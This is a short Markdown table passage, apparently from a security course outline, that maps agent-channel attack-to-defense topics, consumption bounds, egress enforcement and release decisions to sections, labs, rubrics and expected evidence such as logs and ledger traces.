+| Agent-channel attack-to-defense mapping | 18.2 channel list; 18.4 attack-to-defense table; EC-6 to EC-14 | 18.2 Check 4; 18.4 Check 3; LAB D agent-channel extension | D2 (channels in attack plan); D4 (manifest pinning, memory provenance); Authority rubric | Per-channel source/sink/authority row; extension results with stated budget |
 | Principal-keyed consumption bound | 18.5 Example A | 18.5 Practice 1; LAB D ledger tests | D4; Section 09 checks; Authority rubric | Ledger trace; restart test |
 | Egress enforcement | 18.5 proxy/Example B | 18.5 Check 3/Practice 2; LAB D E1–E7/C0/C1 | D5; Incident steps 3–4; Egress rubric | Resolver/listener logs; residual-risk statement |
 | Release decision | 18.6 model/example; EC-5 | 18.6 Checks 3–4; LAB C–D | D6; Incident step 7; Decision rubric | Outcomes, dominance, objective, decision |
